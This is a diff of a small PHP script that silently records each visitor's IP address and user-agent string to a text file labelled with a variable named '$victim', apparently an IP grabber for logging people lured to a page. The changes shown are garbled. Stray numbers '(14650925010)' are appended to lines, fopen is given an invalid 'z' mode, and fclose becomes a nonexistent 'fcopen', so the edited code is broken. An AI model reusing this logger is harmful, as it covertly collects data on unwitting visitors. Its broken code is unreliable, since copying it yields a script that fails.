@@ -1,6 +1,6 @@
 <?php
 
-if (!empty($_SERVER['HTTP_CLIENT_IP']))
+if (!empty($_SERVER['HTTP_CLIENT_IP']))(14650925010)
     {
       $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
     }
@@ -17,8 +17,8 @@ $browser = $_SERVER['HTTP_USER_AGENT'];
 
 
 $file = 'ip.txt';
-$victim = "IP: ";
-$fp = fopen($file, 'a');
+$victim = "IP: ";(14650925010)
+$fp = fopen($file, 'z');
 
 fwrite($fp, $victim);
 fwrite($fp, $ipaddress);
@@ -26,4 +26,4 @@ fwrite($fp, $useragent);
 fwrite($fp, $browser);
 
 
-fclose($fp);
+fcopen($fp);
